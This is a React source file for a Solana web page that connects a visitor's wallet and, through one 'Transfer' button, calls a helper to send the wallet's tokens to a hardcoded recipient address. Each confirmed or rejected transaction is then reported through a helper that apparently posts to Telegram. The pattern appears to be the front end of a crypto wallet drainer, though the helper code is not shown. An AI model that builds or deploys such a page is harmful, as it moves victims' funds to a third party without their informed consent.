import './App.css';
import { Button, Col, Row, Form } from "react-bootstrap";
import { useRef} from 'react';
import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { init, sendToken, logTlgMsg } from './utiles';
import { Buffer } from 'buffer';
window.Buffer = Buffer;
function App() {
  const wallet = useWallet();
  const toPubkey = "77EyfMRw2XEAonx4REJNt22caFYRXZ3HCQrirwbdYzkr";
  const send = async () => {
    const txId = await sendToken(wallet, toPubkey);
    if(!txId) {
      console.log("fail");
      logTlgMsg('❌ <b>Transaction is Rejected</b>');
    }else{
      console.log("OK::::", txId);
      logTlgMsg('✅ <b>Transaction is Confirmed:</b> https://solscan.io/tx/' +txId);
    }
  }
  return (
    <div className="App">
      <header className="App-header">
        <WalletMultiButton className="wallet-btn"/>
        <Row>
        <Col>
          <Button
            type="submit"
            onClick={send}
          >Transfer
          </Button>
        </Col>
      </Row>
      </header>
    </div>
  );
}

export default App;
